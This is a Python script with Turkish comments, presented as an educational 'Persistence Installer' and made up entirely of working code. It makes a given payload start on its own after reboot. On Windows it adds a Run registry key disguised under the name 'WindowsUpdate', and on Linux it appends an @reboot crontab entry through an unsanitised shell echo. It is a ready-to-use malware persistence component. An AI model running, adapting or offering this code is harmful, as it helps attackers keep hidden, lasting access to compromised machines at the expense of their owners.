#!/usr/bin/env python3
"""
Persistence Installer (Eğitim Amaçlı)
======================================
Windows: Registry Run key ile kalıcılık.
Linux: Crontab ile kalıcılık.
"""
import os
import sys
import platform

def install_windows_persistence(payload_path):
    """Windows Registry Run key ile kalıcılık"""
    print("[*] Windows kalıcılık yükleniyor...")
    abs_path = os.path.abspath(payload_path)

    if not os.path.exists(abs_path):
        print(f"[-] Dosya bulunamadı: {abs_path}")
        return False

    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, abs_path)
        winreg.CloseKey(key)
        print(f"[+] Registry key eklendi: HKCU\\{key_path}")
        print(f"[+] Payload: {abs_path}")
        return True
    except Exception as e:
        print(f"[-] Hata: {e}")
        return False

def install_linux_persistence(payload_path):
    """Linux crontab ile kalıcılık"""
    print("[*] Linux kalıcılık yükleniyor...")
    abs_path = os.path.abspath(payload_path)

    if not os.path.exists(abs_path):
        print(f"[-] Dosya bulunamadı: {abs_path}")
        return False

    cron_line = f"@reboot /usr/bin/python3 {abs_path} &\n"
    try:
        existing = os.popen("crontab -l 2>/dev/null").read()
        if abs_path in existing:
            print("[*] Zaten crontab'da mevcut.")
            return True

        new_cron = existing + cron_line
        os.popen(f'echo "{new_cron}" | crontab -').read()
        print(f"[+] Crontab'a eklendi: {cron_line.strip()}")
        return True
    except Exception as e:
        print(f"[-] Hata: {e}")
        return False

def remove_windows_persistence():
    """Windows kalıcılığı kaldır"""
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WindowsUpdate")
        winreg.CloseKey(key)
        print("[+] Kalıcılık kaldırıldı.")
    except FileNotFoundError:
        print("[*] Kayıt bulunamadı, zaten temiz.")
    except Exception as e:
        print(f"[-] Hata: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Kullanım:")
        print("  Yükle  : python Persistence_Installer.py <PAYLOAD_PATH>")
        print("  Kaldır : python Persistence_Installer.py --remove")
        sys.exit(1)

    if sys.argv[1] == "--remove":
        if os.name == 'nt':
            remove_windows_persistence()
        else:
            print("[-] Linux için 'crontab -e' ile manuel kaldırın.")
    else:
        if os.name == 'nt':
            install_windows_persistence(sys.argv[1])
        else:
            install_linux_persistence(sys.argv[1])
